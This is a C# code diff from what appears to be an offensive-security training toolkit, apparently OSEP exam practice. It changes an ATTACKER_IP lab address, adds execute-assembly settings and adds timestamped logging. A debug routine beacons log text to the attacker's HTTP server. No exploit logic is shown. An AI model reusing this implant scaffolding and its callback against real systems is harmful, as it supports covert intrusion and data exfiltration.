@@ -7,7 +7,7 @@ using System.Runtime.InteropServices;
 public static class CONFIG
 {
     //Environment Variables
-    public static string ATTACKER_IP = "192.168.45.175";
+    public static string ATTACKER_IP = "192.168.37.130";
     public static string HTTP_PORT = "80";
     public static string HTTP_URL = $"http://{ATTACKER_IP}:{HTTP_PORT}";
     public static string BINARY_NAME = "exploit.exe";
@@ -28,6 +28,10 @@ public static class CONFIG
     //Commands
     public static string STATIC_COMMAND = "calc.exe"; //If an artifact is running a run off command, it will be this one.
 
+
+    //Execute Assembly Properties
+    public static string EA_STATIC_PATH = @"C:\Users\warum\source\repos\OSEP_2026\TestingArea\bin\x64\result.exe"; //Path to the assembly you want to execute. This is a static path, meaning it will always be the same.
+    public static string[] EA_STATIC_ARGS = { "hello"," world"};
 
 
     //VBA Macro properties
@@ -112,8 +116,11 @@ public static class CONFIG
     public static bool DEBUG_CALLBACK = true;
     public static bool DEBUG_PROCESSDIR = true;
     public static bool DEBUG_USERDIR = true;
+    public static bool DEBUG_TIMESTAMP = true;
+    public static string DEBUG_TIMESTAMP_FORMAT = "[yyyy/MM/dd HH:mm:ss.fff]";
     public static string DEBUG_LOG_NAME = "OSEPLog";
     public static string DEBUG_LOG_EXT = "txt";
+
 
 
    
@@ -150,6 +157,8 @@ public static class Debug
 
         if (CONFIG.DEBUG_USERDIR)
             WriteLogUserDir(logText);
+
+        
     }
 
     public static async void WriteLogCallback(string logText)
@@ -157,7 +166,7 @@ public static class Debug
         try
         {
             HttpClient client = new HttpClient();
-            string response = await client.GetStringAsync($"{CONFIG.HTTP_URL}/{CONFIG.DEBUG_LOG_NAME}/{ Uri.EscapeDataString(logText)}");
+            string response = await client.GetStringAsync($"{CONFIG.HTTP_URL}/{CONFIG.DEBUG_LOG_NAME}/{Uri.EscapeDataString(logText)}");
         }
         catch { }
         
@@ -167,8 +176,13 @@ public static class Debug
     {
         try
         {
+            string timestamp = DateTime.Now.ToString(CONFIG.DEBUG_TIMESTAMP_FORMAT);
             string homeDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{CONFIG.DEBUG_LOG_NAME}.{CONFIG.DEBUG_LOG_EXT}";
-            File.WriteAllText(homeDirectory, logText);
+
+            if (CONFIG.DEBUG_TIMESTAMP)
+                logText = $"{timestamp} {logText}";
+
+            File.AppendAllText(homeDirectory, logText + "\n");
         }
         catch { }
     }
@@ -177,8 +191,12 @@ public static class Debug
     {
         try
         {
+            string timestamp = DateTime.Now.ToString(CONFIG.DEBUG_TIMESTAMP_FORMAT);
             string appDirectory = AppContext.BaseDirectory + $"\\{CONFIG.DEBUG_LOG_NAME}.{CONFIG.DEBUG_LOG_EXT}";
-            File.WriteAllText(appDirectory, logText);
+
+            if (CONFIG.DEBUG_TIMESTAMP)
+                logText = $"{timestamp} {logText}";
+            File.AppendAllText(appDirectory, logText + "\n");
         }
         catch { }
         
